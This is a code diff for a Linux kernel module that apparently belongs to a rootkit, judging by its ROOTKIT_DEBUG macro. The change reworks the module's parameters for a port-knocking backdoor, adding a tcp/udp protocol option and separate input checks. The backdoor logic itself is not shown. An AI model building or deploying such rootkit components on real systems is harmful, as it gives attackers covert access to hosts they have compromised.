@@ -5,8 +5,9 @@
 #include <linux/kernel.h>
 #include <linux/inet.h>
 
-#include "port_knocking.h"
 #include "include.h"
+#include "main.h"
+#include "port_knocking.h"
 
 /*
  * module parameters  
@@ -14,9 +15,10 @@
  */
 static char input_ip[16]; 
 module_param_string(ipv4, input_ip, 16, 0);
-static int port_number;
-module_param(port_number, int, 0);
-
+static int port = -1;
+module_param(port, int, 0);
+static char protocol[4];
+module_param_string(protocol, protocol, 4, 0);
 
 /*
  * Function called when loading the kernel module.
@@ -25,20 +27,34 @@ module_param(port_number, int, 0);
 int init_module (void)
 {	
 	u8 dst[4];
-	int ret;
+	int prot, ret;
 
 	ROOTKIT_DEBUG("Loading port-knocker LKM...\n");
 	
-	/* ensure the input is ipv4 address */
-	ret = in4_pton(input_ip, -1, dst, -1, NULL); // Use the same function for convert into integer
-	
-	if(ret == 0 || port_number<0 || port_number>65535)
-	{
-		ROOTKIT_DEBUG("Invalid IP-address or port number. Please enter the data correctly.\n");
+	/* ensure the input contains a valid ipv4 address */
+	ret = in4_pton(input_ip, -1, dst, -1, NULL);
+	if(ret == 0) {
+		ROOTKIT_DEBUG("Invalid IP-address.\n");
+		return -EINVAL;
+	}
+
+	/* ensure the input contains a valid port */
+	if(port < 0 || port > 65535) {
+		ROOTKIT_DEBUG("Invalid or missing port number.\n");
+		return -EINVAL;
+	}
+
+	/* ensure a supported transport layer protocol is selected in the input */
+	if(strcmp(protocol, "tcp") == 0) {
+		prot = PROTO_TCP ;
+	} else if(strcmp(protocol, "udp") == 0) {
+		prot = PROTO_UDP ;
+	} else {
+		ROOTKIT_DEBUG("Unsupported transport layer protocol.\n");
 		return -EINVAL;
 	}
 	
-	ret = load_port_knocking(input_ip, (unsigned) port_number);
+	ret = load_port_knocking(input_ip, (unsigned) port, prot);
 	if(ret < 0) {
 		ROOTKIT_DEBUG("Error while loading port knocking");
 		return ret;
